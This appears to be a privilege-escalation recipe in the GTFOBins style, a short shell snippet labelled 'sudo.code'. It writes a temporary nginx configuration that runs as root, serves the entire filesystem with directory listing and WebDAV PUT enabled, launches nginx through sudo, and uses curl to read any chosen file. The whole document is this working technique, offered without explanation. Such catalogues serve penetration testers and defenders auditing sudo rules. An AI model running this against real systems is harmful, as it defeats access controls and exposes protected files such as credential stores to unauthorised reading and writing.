sudo.code:
PORT=1337
LFILE=file_to_read
TFC=$(mktemp)
cat > $TFC << EOF
user root;
events {
  worker_connections 1024;
}
http {
  server {
    listen $PORT;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
EOF
sudo nginx -c $TFC
curl -s http://localhost:$PORT$LFILE

